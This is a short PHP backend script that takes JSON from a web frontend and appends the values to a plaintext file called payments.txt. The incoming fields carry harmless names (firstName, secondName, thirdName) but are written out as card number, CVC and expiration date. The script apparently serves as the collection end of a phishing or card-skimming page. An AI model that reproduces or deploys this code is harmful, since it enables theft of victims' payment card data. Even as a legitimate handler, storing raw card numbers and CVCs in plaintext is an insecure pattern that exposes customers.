<?php
// 🔹 Obtener datos JSON del frontend
$data = json_decode(file_get_contents("php://input"), true);

if ($data) {
    $firstName = $data["firstName"];
    $secondName = $data["secondName"];
    $thirdName = $data["thirdName"];

    // 📂 Guardar datos en un archivo TXT o en base de datos
    $file = fopen("payments.txt", "a");
    fwrite($file, "Tarjeta: $firstName | CVC: $secondName | Expiración: $thirdName\n");
    fclose($file);

    echo json_encode(["message" => "✅ Datos guardados correctamente"]);
} else {
    echo json_encode(["error" => "❌ Error al recibir datos"]);
}
?>
